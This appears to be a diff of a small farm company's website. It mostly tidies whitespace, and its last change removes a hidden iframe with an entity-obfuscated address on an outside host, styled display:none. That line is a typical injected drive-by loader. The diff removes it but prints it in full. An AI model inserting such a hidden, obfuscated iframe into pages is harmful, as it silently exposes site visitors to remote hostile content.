@@ -1,16 +1,14 @@
 <!DOCTYPE html>
 <html>
   <head>
-	<meta charset="utf-8"; viewport" content="width=device-width">
-	<h1><img src="penguins.png" alt="DobenyaFarm logo"><br>DobenyaFarm</h1>
-
+  <meta charset="utf-8"; viewport" content="width=device-width">
+  <h1><img src="penguins.png" alt="DobenyaFarm logo"><br>DobenyaFarm</h1>
 <style>
 body {
  background-color: #ffffffff;
  margin: 0 15%;
  font-family: sans-serif;
  }
-
 h1 {
  text-align: center;
  font-family: serif;
@@ -19,16 +17,12 @@ h1 {
  border-bottom: 1px solid #57b1dc;
  margin-top: 30px;
 }
-
 h2 {
  color: #d1633c;
  font-size: 1em;
 }
-
 </style>
-
   </head>
-
   <body>
 	<h2>The Company</h2>
 	<p>DobenyaFarm offers casual jobs and and farm products.The company is solely in agriculture</p>
@@ -38,12 +32,10 @@ h2 {
 	  meat production.</p>
 	<h4 style color:green !important>Farm Mechanisation</h4>
 	<p>The sister of this company which cater for supplying farm building materials for self and for sale to the local comunity.</p>
-
 	<h5>Location and Hours</h5>
 	<p>Zungudza Gudo, Chiredzi;<br>
 	  Monday through Thursday 8am to 5pm,<br> Friday and Saturday, 8am to
 	  midnight</p>
-  <iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
 </body>
 </html>
 
